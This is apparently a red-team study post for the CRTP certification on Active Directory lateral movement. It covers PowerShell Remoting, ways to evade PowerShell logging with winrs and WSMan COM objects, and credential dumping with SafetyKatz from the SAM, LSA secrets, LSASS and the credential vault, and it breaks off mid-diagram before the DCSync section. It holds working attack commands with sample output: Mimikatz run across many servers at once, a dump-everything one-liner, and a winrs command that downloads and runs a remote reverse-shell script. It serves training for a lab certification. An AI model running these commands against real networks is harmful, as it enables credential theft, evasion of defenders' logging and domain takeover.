---
title: "CRTP Deep Dive: Lateral Movement — PSRemoting, Credential Extraction, DCSync & Over-Pass-the-Hash"
date: 2026-04-08 19:00:00 +0200
categories: [Red Team, CRTP]
tags: [lateral-movement, psremoting, winrm, credential-extraction, dcsync, overpass-the-hash, active-directory, windows, crtp]
description: "A comprehensive guide covering PowerShell Remoting (One-to-One & One-to-Many), credential extraction from LSASS and beyond, DCSync attacks, and Over-Pass-the-Hash — all from the CRTP perspective with detailed examples and outputs."
image:
  path: /assets/img/headers/lateral-movement-banner.png
  alt: "Lateral Movement & Credential Extraction"
pin: true
math: true
mermaid: true
---

## Introduction

Once you have a foothold in an Active Directory environment, the next objective is **lateral movement** — pivoting from one machine to another to expand access and ultimately reach high-value targets like Domain Controllers.

This post covers the core lateral movement and credential extraction techniques tested in the **Certified Red Team Professional (CRTP)** course:

1. **PowerShell Remoting (PSRemoting)** — One-to-One and One-to-Many execution
2. **Evading PSRemoting Logging** — Using `winrs` and `WSMan COM objects`
3. **Credential Extraction** — LSASS, SAM, LSA Secrets, DPAPI, and beyond
4. **DCSync** — Extracting credentials from the DC without code execution
5. **Over-Pass-the-Hash (OPTH)** — Generating Kerberos tokens from hashes/keys

> All commands in this post are **PowerShell-based** and designed for **Windows environments**, as used in CRTP labs.
{: .prompt-info }

---

## PowerShell Remoting (PSRemoting)

### What is PSRemoting?

Think of PSRemoting as **PsExec on steroids** — but much more silent and blazing fast. It is the native, Microsoft-recommended way to manage Windows servers remotely.

```
┌──────────────────────────────────────────────────────────────────┐
│                   PSREMOTING AT A GLANCE                         │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Protocol  : WinRM (Windows Remote Management)                   │
│               Microsoft's implementation of WS-Management        │
│                                                                  │
│  Ports     : 5985 (HTTP)  |  5986 (HTTPS)                       │
│                                                                  │
│  Enabled   : By default on Server 2012 and later                 │
│               (with firewall exception pre-configured)           │
│                                                                  │
│  Process   : Runs as HIGH INTEGRITY process                      │
│               → You get an ELEVATED shell automatically          │
│                                                                  │
│  Use Case  : Recommended way to manage Windows Core Servers      │
│                                                                  │
│  Auth      : Kerberos (default in domain) | NTLM | Certificate  │
│                                                                  │
│  Why Red   : ✓ Built-in — no tools to upload                    │
│  Teamers   : ✓ Encrypted traffic (HTTP/HTTPS + SOAP)            │
│  Love It   : ✓ Blends with normal admin traffic                 │
│              : ✓ Runs in high-integrity context                  │
│              : ✓ Can target multiple machines simultaneously     │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### How PSRemoting Works Under the Hood

```
┌──────────────────────────────────────────────────────────────────┐
│             PSREMOTING ARCHITECTURE                               │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ATTACKER MACHINE                    TARGET MACHINE              │
│  ┌──────────────────┐                ┌─────────────────────┐     │
│  │  PowerShell.exe  │                │  svchost.exe        │     │
│  │                  │   WinRM/SOAP   │  (hosting WinRM)    │     │
│  │  Enter-PSSession │ ─────────────► │       │              │     │
│  │  Invoke-Command  │  Port 5985     │       ▼              │     │
│  │                  │  (HTTP)        │  wsmprovhost.exe    │     │
│  │                  │                │  (new process per   │     │
│  │                  │  Port 5986     │   session — runs as │     │
│  │                  │  (HTTPS)       │   HIGH INTEGRITY)   │     │
│  │                  │                │       │              │     │
│  │                  │   Serialized   │       ▼              │     │
│  │                  │ ◄───────────── │  Command Output     │     │
│  │                  │   Output       │  (serialized XML)   │     │
│  └──────────────────┘                └─────────────────────┘     │
│                                                                  │
│  KEY POINTS:                                                     │
│  • Each PSSession spawns a new wsmprovhost.exe process           │
│  • Output is serialized as SOAP/XML and sent back                │
│  • Session can be stateful (PSSession) or stateless (Invoke-Cmd) │
│  • Kerberos auth by default in domain environments               │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

### One-to-One: PSSession (Interactive & Stateful)

One-to-One remoting gives you an **interactive shell** on a single remote machine. It is **stateful** — variables, loaded modules, and context persist across commands within the same session.

```
┌──────────────────────────────────────────────────────────────────┐
│              ONE-TO-ONE PSREMOTING (PSSession)                    │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Characteristics:                                                │
│  ┌─────────────────────────────────────────────────┐             │
│  │  ✓ Interactive      — real-time shell           │             │
│  │  ✓ Stateful         — variables persist         │             │
│  │  ✓ New Process      — spawns wsmprovhost.exe    │             │
│  │  ✓ High Integrity   — elevated context          │             │
│  │  ✓ Encrypted        — WinRM SOAP over HTTP/S    │             │
│  └─────────────────────────────────────────────────┘             │
│                                                                  │
│  Key Cmdlets:                                                    │
│  ┌────────────────────┬────────────────────────────┐             │
│  │ New-PSSession      │ Create a persistent session│             │
│  │ Enter-PSSession    │ Enter interactive session  │             │
│  │ Exit-PSSession     │ Leave the session          │             │
│  │ Get-PSSession      │ List all sessions          │             │
│  │ Remove-PSSession   │ Destroy a session          │             │
│  │ Disconnect-PSSession│ Disconnect (keep alive)   │             │
│  │ Connect-PSSession  │ Reconnect to session       │             │
│  └────────────────────┴────────────────────────────┘             │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

#### Basic Usage

```powershell
# ============================================================
# METHOD 1: Quick Interactive Session (Enter-PSSession)
# ============================================================

# Connect directly to a remote machine
Enter-PSSession -ComputerName dcorp-adminsrv

# You are now ON the remote machine:
# [dcorp-adminsrv]: PS C:\Users\student1\Documents>

# Run commands as if you were sitting at the machine
whoami
hostname
ipconfig /all
Get-Process

# Leave the session
Exit-PSSession
```

#### Example Output

```
PS C:\Users\student1> Enter-PSSession -ComputerName dcorp-adminsrv

[dcorp-adminsrv]: PS C:\Users\student1\Documents> whoami
dcorp\student1

[dcorp-adminsrv]: PS C:\Users\student1\Documents> hostname
dcorp-adminsrv

[dcorp-adminsrv]: PS C:\Users\student1\Documents> Get-Process | Select-Object -First 5

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    175      11     2468       9040       0.14   3164   0 conhost
    488      18     2236       5624       0.42    564   0 csrss
    276      12     1816       4636       0.16    632   1 csrss
    357      15    11232      16760       0.69   2456   0 dfsrs
    190      13     3696      12080       1.25   2468   0 dfssvc

[dcorp-adminsrv]: PS C:\Users\student1\Documents> Exit-PSSession
PS C:\Users\student1>
```

#### Using Persistent Sessions (Recommended)

```powershell
# ============================================================
# METHOD 2: Persistent Session (New-PSSession + Enter-PSSession)
# ============================================================

# Create a persistent session (stored in a variable)
$sess = New-PSSession -ComputerName dcorp-adminsrv

# View the session details
$sess

# Enter the session interactively
Enter-PSSession -Session $sess

# Do your work...
whoami
Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object -First 10

# Exit but the session stays alive!
Exit-PSSession

# Re-enter the same session later (state is preserved!)
Enter-PSSession -Session $sess

# The variable $x from before still exists!
# This is what "stateful" means.

# When done, clean up
Remove-PSSession -Session $sess
```

#### Example Output

```
PS C:\Users\student1> $sess = New-PSSession -ComputerName dcorp-adminsrv
PS C:\Users\student1> $sess

 Id Name            ComputerName    ComputerType    State    ConfigurationName     Availability
 -- ----            ------------    ------------    -----    -----------------     ------------
  1 WinRM1          dcorp-adminsrv  RemoteMachine   Opened   Microsoft.PowerShell  Available

PS C:\Users\student1> Enter-PSSession -Session $sess
[dcorp-adminsrv]: PS C:\Users\student1\Documents> $x = "I am persistent!"
[dcorp-adminsrv]: PS C:\Users\student1\Documents> $x
I am persistent!
[dcorp-adminsrv]: PS C:\Users\student1\Documents> Exit-PSSession

PS C:\Users\student1> Enter-PSSession -Session $sess
[dcorp-adminsrv]: PS C:\Users\student1\Documents> $x
I am persistent!
```

#### Using Credentials

```powershell
# ============================================================
# METHOD 3: Connect with Explicit Credentials
# ============================================================

# Create a credential object
$cred = New-Object System.Management.Automation.PSCredential(
    "dcorp\svcadmin",
    (ConvertTo-SecureString "P@ssw0rd!2025" -AsPlainText -Force)
)

# Create session with explicit credentials
$sess = New-PSSession -ComputerName dcorp-dc -Credential $cred

# Enter the session
Enter-PSSession -Session $sess

# Now you're on the DC as svcadmin!
whoami
# dcorp\svcadmin
```

---

### One-to-Many: Invoke-Command (Fan-Out Remoting)

One-to-Many remoting (also called **Fan-Out Remoting**) lets you execute commands on **multiple machines simultaneously**. It is non-interactive but incredibly powerful for mass operations.

```
┌──────────────────────────────────────────────────────────────────┐
│            ONE-TO-MANY (FAN-OUT) REMOTING                        │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Characteristics:                                                │
│  ┌─────────────────────────────────────────────────┐             │
│  │  ✓ Non-interactive — fire and collect results   │             │
│  │  ✓ Parallel        — executes on all targets    │             │
│  │  ✓ Scalable        — 10, 100, 1000+ machines    │             │
│  │  ✓ Best cmdlet     — Invoke-Command              │             │
│  └─────────────────────────────────────────────────┘             │
│                                                                  │
│                   ┌──────────┐                                   │
│                   │ Attacker │                                   │
│                   └─────┬────┘                                   │
│                ┌────────┼────────┐                               │
│                │        │        │                               │
│                ▼        ▼        ▼                               │
│          ┌─────────┐┌─────────┐┌─────────┐                      │
│          │Server 1 ││Server 2 ││Server 3 │  ← All execute       │
│          │         ││         ││         │    simultaneously     │
│          └─────────┘└─────────┘└─────────┘                      │
│                │        │        │                               │
│                └────────┼────────┘                               │
│                         │                                        │
│                         ▼                                        │
│               Results Collected                                  │
│               (with PSComputerName)                              │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

#### Execute Commands via ScriptBlock

```powershell
# ============================================================
# 1. RUN A SCRIPTBLOCK ON MULTIPLE SERVERS
# ============================================================

# Execute a command on all servers listed in a file
Invoke-Command -ScriptBlock {Get-Process} -ComputerName (Get-Content C:\AD\Tools\servers.txt)

# Execute on specific machines
Invoke-Command -ScriptBlock {whoami; hostname} -ComputerName dcorp-adminsrv, dcorp-mgmt, dcorp-ci

# Execute with verbose output
Invoke-Command -ScriptBlock {
    Get-Service | Where-Object {$_.Status -eq 'Running'}
} -ComputerName (Get-Content C:\AD\Tools\servers.txt) -Verbose
```

#### Example Output

```
PS C:\> Invoke-Command -ScriptBlock {whoami; hostname} -ComputerName dcorp-adminsrv, dcorp-mgmt

dcorp\student1
dcorp-adminsrv
dcorp\student1
dcorp-mgmt

PSComputerName  RunspaceId
--------------  ----------
dcorp-adminsrv  a1b2c3d4-e5f6-7890-abcd-ef1234567890
dcorp-mgmt      b2c3d4e5-f6a7-8901-bcde-f12345678901
```

#### Execute Scripts from Files

```powershell
# ============================================================
# 2. RUN A SCRIPT FILE ON REMOTE MACHINES
# ============================================================

# Execute a local script file on remote machines
# The script is read LOCALLY and sent to remote machines for execution
Invoke-Command -FilePath C:\AD\Tools\Get-PassHashes.ps1 -ComputerName (Get-Content C:\AD\Tools\servers.txt)

# Execute Invoke-Mimikatz on all servers
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -ComputerName (Get-Content C:\AD\Tools\servers.txt)
```

> When using `-FilePath`, the script is read from your LOCAL machine and transmitted to the remote machines. The script does NOT need to exist on the remote machines.
{: .prompt-tip }

#### Execute Locally Loaded Functions Remotely

```powershell
# ============================================================
# 3. RUN A LOCALLY LOADED FUNCTION ON REMOTE MACHINES
# ============================================================

# First, load the function into your current session
. .\Get-PassHashes.ps1

# Now pass the function to remote machines using ${function:Name} syntax
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content C:\AD\Tools\servers.txt)

# Pass a function with arguments (positional arguments only!)
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content C:\AD\Tools\servers.txt) -ArgumentList "arg1", "arg2"
```

> When using `${function:FunctionName}`, only **positional arguments** can be passed via `-ArgumentList`. Named parameters are not supported with this syntax.
{: .prompt-warning }

#### Stateful Commands with Invoke-Command (Using Sessions)

```powershell
# ============================================================
# 4. STATEFUL EXECUTION WITH INVOKE-COMMAND + SESSIONS
# ============================================================

# Create a persistent session
$Sess = New-PSSession -ComputerName dcorp-adminsrv

# Command 1: Store data in a variable on the remote machine
Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}

# Command 2: Access that variable in a subsequent command
Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}

# The variable $Proc persists because we're using the same session!
# Without -Session, each Invoke-Command creates a NEW session
# and all variables are lost.
```

#### Example Output

```
PS C:\> $Sess = New-PSSession -ComputerName dcorp-adminsrv

PS C:\> Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}

PS C:\> Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
conhost
csrss
csrss
dfsrs
dfssvc
dns
dwm
Idle
ismserv
lsass
Microsoft.ActiveDirectory.WebServices
msdtc
ntfrs
powershell
services
smss
spoolsv
svchost
svchost
svchost
svchost
System
wininit
winlogon
wsmprovhost
```

### Complete Fan-Out Remoting Example

```powershell
# ============================================================
# FULL LATERAL MOVEMENT SCENARIO WITH INVOKE-COMMAND
# ============================================================

# Step 1: Discover live machines (quick port scan for WinRM)
$servers = @("dcorp-adminsrv", "dcorp-mgmt", "dcorp-ci", "dcorp-sql")
$alive = $servers | Where-Object {
    Test-NetConnection -ComputerName $_ -Port 5985 -InformationLevel Quiet
}
Write-Output "[+] WinRM accessible on: $($alive -join ', ')"

# Step 2: Enumerate all machines in parallel
Invoke-Command -ScriptBlock {
    [PSCustomObject]@{
        Hostname     = $env:COMPUTERNAME
        User         = $env:USERNAME
        Domain       = $env:USERDOMAIN
        OS           = (Get-WmiObject Win32_OperatingSystem).Caption
        IP           = (Get-NetIPAddress -AddressFamily IPv4 | 
                       Where-Object {$_.IPAddress -ne '127.0.0.1'}).IPAddress
        IsAdmin      = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        LocalAdmins  = (net localgroup administrators | Where-Object {$_ -and $_ -notmatch "command completed|---|----|Alias|Comment|Members"}) -join "; "
    }
} -ComputerName $alive | Format-Table -AutoSize

# Step 3: Load function and execute on all machines
. .\Invoke-Mimikatz.ps1
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName $alive

# Step 4: Run a specific tool from file
Invoke-Command -FilePath C:\AD\Tools\Get-PassHashes.ps1 -ComputerName $alive
```

#### Example Output

```
Hostname        User      Domain OS                                    IP            IsAdmin LocalAdmins
--------        ----      ------ --                                    --            ------- -----------
dcorp-adminsrv  student1  dcorp  Windows Server 2022 Standard          172.16.2.1    True    Administrator; dcorp\Domain Admins
dcorp-mgmt      student1  dcorp  Windows Server 2022 Standard          172.16.3.1    True    Administrator; dcorp\mgmtadmin
dcorp-ci        student1  dcorp  Windows Server 2022 Standard          172.16.4.1    True    Administrator; dcorp\ciadmin
dcorp-sql       student1  dcorp  Windows Server 2022 Standard          172.16.5.1    False   Administrator; dcorp\sqladmin
```

### One-to-One vs One-to-Many Comparison

```
┌──────────────────────────────────────────────────────────────────┐
│          ONE-TO-ONE vs ONE-TO-MANY COMPARISON                    │
├─────────────────────┬────────────────────┬───────────────────────┤
│ Feature             │ One-to-One         │ One-to-Many           │
│                     │ (PSSession)        │ (Invoke-Command)      │
├─────────────────────┼────────────────────┼───────────────────────┤
│ Interactive?        │ ✓ Yes              │ ✗ No (fire & forget)  │
│ Stateful?           │ ✓ Always           │ ✓ Only with -Session  │
│ Parallel?           │ ✗ Single target    │ ✓ Multiple targets    │
│ Process spawned     │ wsmprovhost.exe    │ wsmprovhost.exe       │
│ Best use case       │ Interactive recon, │ Mass command exec,    │
│                     │ manual exploration │ parallel enumeration  │
│ Run scripts?        │ Manual import      │ -FilePath parameter   │
│ Pass functions?     │ Manual             │ ${function:Name}      │
│ Key cmdlets         │ Enter-PSSession    │ Invoke-Command        │
│                     │ New-PSSession      │                       │
│ Typical CRTP usage  │ Explore a single   │ Sweep entire domain,  │
│                     │ high-value target  │ dump creds everywhere │
├─────────────────────┴────────────────────┴───────────────────────┤
│ CRTP TIP: Use One-to-Many for initial sweep, then One-to-One    │
│ for deep-diving into interesting targets you discovered.         │
└──────────────────────────────────────────────────────────────────┘
```

---

## Evading PSRemoting Logging

### The Logging Problem

PowerShell remoting supports **system-wide transcripts** and **deep script block logging**. This means defenders can see every command you execute through PSRemoting.

```
┌──────────────────────────────────────────────────────────────────┐
│              PSREMOTING LOGGING DETECTION                         │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  What Gets Logged When Using PSRemoting:                         │
│                                                                  │
│  ┌─────────────────────────────────────────────────┐             │
│  │ Event ID 4103 — Module Logging                  │             │
│  │  Records pipeline execution details             │             │
│  │                                                  │             │
│  │ Event ID 4104 — Script Block Logging            │             │
│  │  Records FULL content of every script block     │             │
│  │  executed — even if deobfuscated at runtime!    │             │
│  │                                                  │             │
│  │ Transcription Logs                              │             │
│  │  Full text transcript of every command + output │             │
│  │  saved to a file (if configured via GPO)        │             │
│  │                                                  │             │
│  │ Event ID 53504 (WinRM Operational)              │             │
│  │  Records incoming WSMan connections             │             │
│  └─────────────────────────────────────────────────┘             │
│                                                                  │
│  ★ PROBLEM: Every Invoke-Command and Enter-PSSession             │
│    leaves detailed traces for blue team!                         │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Solution 1: winrs (Windows Remote Shell)

`winrs` is a native Windows command-line tool that uses WinRM (port 5985) but **does NOT invoke PowerShell** on the source machine — it talks directly to the WinRM service. This bypasses PowerShell transcription and script block logging on the initiating host.

```powershell
# ============================================================
# WINRS — Evade PowerShell Logging on Source Machine
# ============================================================

# Basic command execution
winrs -remote:dcorp-adminsrv -u:dcorp\svcadmin -p:P@ssw0rd!2025 hostname

# Get an interactive cmd shell on the remote machine
winrs -remote:dcorp-adminsrv -u:dcorp\svcadmin -p:P@ssw0rd!2025 cmd

# Execute multiple commands
winrs -remote:dcorp-adminsrv -u:dcorp\svcadmin -p:P@ssw0rd!2025 "whoami & hostname & ipconfig"

# Run PowerShell on the REMOTE side (logging happens there, not locally)
winrs -remote:dcorp-adminsrv -u:dcorp\svcadmin -p:P@ssw0rd!2025 powershell -ep bypass -c "Get-Process"

# Without explicit credentials (uses current user's Kerberos ticket)
winrs -remote:dcorp-adminsrv hostname

# Execute a reverse shell payload
winrs -remote:dcorp-adminsrv -u:dcorp\svcadmin -p:P@ssw0rd!2025 "powershell -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://172.16.100.1/rev.ps1')"
```

#### Example Output

```
C:\Users\student1> winrs -remote:dcorp-adminsrv -u:dcorp\svcadmin -p:P@ssw0rd!2025 "whoami & hostname"
dcorp\svcadmin
dcorp-adminsrv

C:\Users\student1> winrs -remote:dcorp-adminsrv hostname
dcorp-adminsrv
```

### Solution 2: WSMan COM Objects

The [WSMan-WinRM](https://github.com/bohops/WSMan-WinRM) project by bohops provides PowerShell scripts that use **COM objects** of the WSMan.Automation class to interact with WinRM — effectively bypassing standard PowerShell logging.

```powershell
# ============================================================
# WSMAN COM OBJECTS — Alternative PSRemoting via COM
# ============================================================

# Method 1: Using the SharpWSManWinRM project
# This creates a WinRM session using COM objects instead of PowerShell cmdlets

# Initialize the WSMan COM object
$wsman = New-Object -ComObject WSMan.Automation
$options = $wsman.CreateConnectionOptions()

# Set credentials
$options.UserName = "dcorp\svcadmin"
$options.Password = "P@ssw0rd!2025"

# Connect to the remote host
$session = $wsman.CreateSession(
    "http://dcorp-adminsrv:5985/wsman",
    0,
    $options
)

# Execute a command through WMI resource URI
$resource = "http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Process"
$parameters = @"
<p:Create_INPUT xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Process">
<p:CommandLine>cmd.exe /c whoami > C:\Users\Public\output.txt</p:CommandLine>
</p:Create_INPUT>
"@

$session.Invoke("Create", $resource, $parameters)

# Read the output
$session.Get("http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_OperatingSystem")
```

### Logging Evasion Comparison

```
┌──────────────────────────────────────────────────────────────────┐
│           LOGGING EVASION COMPARISON                              │
├──────────────────┬──────────────┬──────────────┬─────────────────┤
│ Method           │ PSRemoting   │ winrs        │ WSMan COM       │
├──────────────────┼──────────────┼──────────────┼─────────────────┤
│ PowerShell       │ ✗ Logged     │ ✓ Bypassed   │ ✓ Bypassed      │
│ Transcription    │              │ (on source)  │ (on source)     │
│                  │              │              │                 │
│ Script Block     │ ✗ Logged     │ ✓ Bypassed   │ ✓ Bypassed      │
│ Logging          │              │ (on source)  │ (on source)     │
│                  │              │              │                 │
│ Module Logging   │ ✗ Logged     │ ✓ Bypassed   │ ✓ Bypassed      │
│                  │              │ (on source)  │ (on source)     │
│                  │              │              │                 │
│ WinRM Operational│ ✗ Logged     │ ✗ Logged     │ ✗ Logged        │
│ (on target)      │              │              │                 │
│                  │              │              │                 │
│ Uses Port        │ 5985/5986    │ 5985/5986    │ 5985/5986       │
│                  │              │              │                 │
│ Ease of Use      │ ★★★★★       │ ★★★★☆       │ ★★★☆☆          │
│                  │              │              │                 │
│ CRTP Recommended │ Default      │ For stealth  │ Advanced stealth│
├──────────────────┴──────────────┴──────────────┴─────────────────┤
│ NOTE: All methods still generate logs on the TARGET machine.     │
│ The evasion is for the SOURCE (attacker) machine's PS logging.   │
└──────────────────────────────────────────────────────────────────┘
```

---

## Credential Extraction

### LSASS — The Crown Jewel

The **Local Security Authority Subsystem Service (LSASS)** is responsible for authentication on a Windows machine. It stores credentials in multiple forms and is the most attractive — and most monitored — target.

```
┌──────────────────────────────────────────────────────────────────┐
│               LSASS CREDENTIAL STORAGE                           │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│                    ┌──────────────────┐                           │
│                    │     LSASS.exe    │                           │
│                    │  (lsass process) │                           │
│                    └────────┬─────────┘                           │
│                             │                                    │
│              ┌──────────────┼──────────────┐                     │
│              │              │              │                     │
│              ▼              ▼              ▼                     │
│     ┌──────────────┐ ┌──────────┐ ┌─────────────┐               │
│     │  NT Hashes   │ │ Kerberos │ │ Cleartext   │               │
│     │  (NTLM)      │ │ Tickets  │ │ Passwords   │               │
│     │              │ │ (TGT/TGS)│ │ (if WDigest │               │
│     │              │ │          │ │  enabled)    │               │
│     └──────────────┘ └──────────┘ └─────────────┘               │
│              │              │              │                     │
│              ▼              ▼              ▼                     │
│     ┌──────────────┐ ┌──────────┐ ┌─────────────┐               │
│     │  AES Keys    │ │ DES Keys │ │ DPAPI Master│               │
│     │  (128/256)   │ │          │ │ Keys        │               │
│     └──────────────┘ └──────────┘ └─────────────┘               │
│                                                                  │
│  LSASS stores credentials when a user:                           │
│  ┌─────────────────────────────────────────────────┐             │
│  │ • Logs on to a local session or RDP             │             │
│  │ • Uses RunAs                                    │             │
│  │ • Runs a Windows service                        │             │
│  │ • Runs a scheduled task or batch job            │             │
│  │ • Uses a Remote Administration tool             │             │
│  └─────────────────────────────────────────────────┘             │
│                                                                  │
│  ★ Every interactive logon caches credentials in LSASS!         │
│  ★ On a DC → LSASS may hold creds for ALL domain users          │
│    who recently authenticated!                                   │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Credentials WITHOUT Touching LSASS

The LSASS process is the most monitored process on a Windows machine. EDRs, AVs, and Credential Guard all protect it. However, many credential types can be extracted **without touching LSASS**:

```
┌──────────────────────────────────────────────────────────────────┐
│        CREDENTIAL SOURCES THAT DON'T REQUIRE LSASS ACCESS        │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌─────────────────────────────────────────────────────────┐     │
│  │ 1. SAM HIVE (Registry)                                  │     │
│  │    Location: HKLM\SAM                                   │     │
│  │    Contains: Local account NT hashes                    │     │
│  │    Access:   Local Administrator                        │     │
│  │    Risk:     Medium — only local accounts               │     │
│  └─────────────────────────────────────────────────────────┘     │
│                                                                  │
│  ┌─────────────────────────────────────────────────────────┐     │
│  │ 2. LSA SECRETS / SECURITY HIVE (Registry)               │     │
│  │    Location: HKLM\SECURITY                              │     │
│  │    Contains: ★ Service account passwords (cleartext!)   │     │
│  │              ★ Domain cached credentials (DCC2)         │     │
│  │              ★ Machine account password                  │     │
│  │              ★ DPAPI system master key                   │     │
│  │    Access:   SYSTEM                                     │     │
│  │    Risk:     HIGH — service accounts often have DA!     │     │
│  └─────────────────────────────────────────────────────────┘     │
│                                                                  │
│  ┌─────────────────────────────────────────────────────────┐     │
│  │ 3. DPAPI PROTECTED CREDENTIALS (Disk)                   │     │
│  │    Locations:                                           │     │
│  │      %APPDATA%\Microsoft\Credentials\                   │     │
│  │      %LOCALAPPDATA%\Microsoft\Credentials\              │     │
│  │      %APPDATA%\Microsoft\Protect\                       │     │
│  │    Contains: ★ Credential Manager / Vault entries       │     │
│  │              ★ Browser cookies (Chrome, Edge)           │     │
│  │              ★ Certificates & private keys              │     │
│  │              ★ Azure / O365 tokens                      │     │
│  │              ★ Wi-Fi passwords                          │     │
│  │              ★ RDP saved credentials                    │     │
│  │    Access:   User context (or SYSTEM + DPAPI keys)      │     │
│  │    Risk:     HIGH — Azure tokens = cloud takeover!      │     │
│  └─────────────────────────────────────────────────────────┘     │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Extracting Credentials — Practical Commands

```powershell
# ============================================================
# 1. DUMP SAM HIVE — Local Account Hashes
# ============================================================

# Using SafetyKatz (CRTP's tool of choice)
SafetyKatz.exe "lsadump::sam" "exit"

# Using reg.exe to save registry hives (for offline extraction)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
# Transfer files to attacker machine for offline parsing

# ============================================================
# 2. DUMP LSA SECRETS — Service Account Passwords
# ============================================================

# Using SafetyKatz
SafetyKatz.exe "lsadump::secrets" "exit"

# ============================================================
# 3. DUMP CACHED DOMAIN CREDENTIALS
# ============================================================

# Using SafetyKatz
SafetyKatz.exe "lsadump::cache" "exit"

# ============================================================
# 4. DUMP LSASS (when you must touch it)
# ============================================================

# Using SafetyKatz — dumps logon passwords from LSASS
SafetyKatz.exe "sekurlsa::logonPasswords" "exit"

# Using SafetyKatz — dump Kerberos encryption keys
SafetyKatz.exe "sekurlsa::ekeys" "exit"

# ============================================================
# 5. DUMP DPAPI CREDENTIALS — Credential Manager / Vault
# ============================================================

# List Credential Vault entries
SafetyKatz.exe "vault::cred" "exit"
SafetyKatz.exe "vault::list" "exit"

# ============================================================
# 6. DUMP EVERYTHING (the kitchen sink)
# ============================================================

SafetyKatz.exe "token::elevate" "vault::cred" "vault::list" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "sekurlsa::logonPasswords" "exit"
```

#### Example: SAM Hive Dump Output

```
PS C:\AD\Tools> SafetyKatz.exe "lsadump::sam" "exit"

Domain : DCORP-ADMINSRV
SysKey : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6

Local SID : S-1-5-21-1874506631-3219952063-538504511

SAMKey : 0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: a87f3a337d73085c45f9416be5787d86

RID  : 000001f5 (501)
User : Guest
  Hash NTLM: <empty>

RID  : 000003e8 (1000)
User : srvadmin
  Hash NTLM: 32ed87bdb5fdc5e9cba88547376818d4
```

#### Example: LSA Secrets Dump Output

```
PS C:\AD\Tools> SafetyKatz.exe "lsadump::secrets" "exit"

Domain : DCORP-ADMINSRV

Policy subsance name : (null)

Secret  : _SC_SQLService
cur/text: SuperSecretSQL@2025

Secret  : _SC_SvcBackup
cur/text: BackupAdmin!P@ss

Secret  : DPAPI_SYSTEM
cur/hex : 01000000 d08c9ddf 0115d111 8c7a00c0 4fc297eb ...

Secret  : $MACHINE.ACC
cur/hex : 6a 17 25 c8 ...
    NTLM: 5f2b7c9e1a3d4f6b8c0e2a4d6f8b0c2e
```

#### Example: Kerberos Encryption Keys Output

```
PS C:\AD\Tools> SafetyKatz.exe "sekurlsa::ekeys" "exit"

Authentication Id : 0 ; 453216 (00000000:0006ea60)
Session           : Interactive from 1
User Name         : svcadmin
Domain            : DCORP
Logon Server      : DCORP-DC
Logon Time        : 4/8/2026 2:30:15 PM

         * Username : svcadmin
         * Domain   : DCORP.DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac  6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
           aes128_hmac  b65ea8151f13a31d01377f5934bf3883
           rc4_hmac_nt  a87f3a337d73085c45f9416be5787d86
           rc4_hmac_old a87f3a337d73085c45f9416be5787d86
           rc4_md4      a87f3a337d73085c45f9416be5787d86
           rc4_hmac_nt_exp a87f3a337d73085c45f9416be5787d86
           rc4_hmac_old_exp a87f3a337d73085c45f9416be5787d86
```

### Credential Extraction Decision Tree

```
┌──────────────────────────────────────────────────────────────────┐
│         CREDENTIAL EXTRACTION DECISION TREE                      │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  What access do you have?                                        │
│  │                                                               │
│  ├── Local Admin on workstation/server?                          │
│  │   ├── Can you touch LSASS?                                    │
│  │   │   ├── YES → sekurlsa::logonPasswords (domain creds!)     │
│  │   │   │        → sekurlsa::ekeys (Kerberos keys!)            │
│  │   │   └── NO  → lsadump::sam (local hashes)                  │
│  │   │           → lsadump::secrets (service account passwords) │
│  │   │           → lsadump::cache (cached domain creds)         │
│  │   │           → vault::cred (DPAPI stored creds)             │
│  │   │           → reg save (offline extraction)                │
│  │   └──                                                        │
│  │                                                               │
│  ├── Domain Admin / Enterprise Admin?                            │
│  │   └── Use DCSync! (no code execution on DC needed)            │
│  │       → lsadump::dcsync /user:dcorp\krbtgt                   │
│  │       → lsadump::dcsync /user:dcorp\Administrator            │
│  │       → lsadump::dcsync /all /csv                            │
│  │                                                               │
